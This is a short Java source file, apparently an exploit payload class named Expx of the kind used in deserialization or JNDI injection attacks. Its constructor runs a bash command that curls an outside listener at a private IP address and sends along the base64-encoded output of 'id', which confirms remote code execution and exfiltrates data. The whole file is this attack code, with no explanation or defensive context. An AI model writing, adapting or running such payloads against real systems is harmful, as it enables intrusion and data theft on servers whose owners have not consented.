public class Expx{
public Expx(){
try{
Runtime.getRuntime().exec(new String[] {"/bin/bash","-c","curl http://192.168.0.181:11011/?echo=$(echo -n $(id) | base64)"});
}catch (Exception e){
e.printStackTrace();
}
}
public static void main(String[] argv){
Expx c = new Expx();
}
}
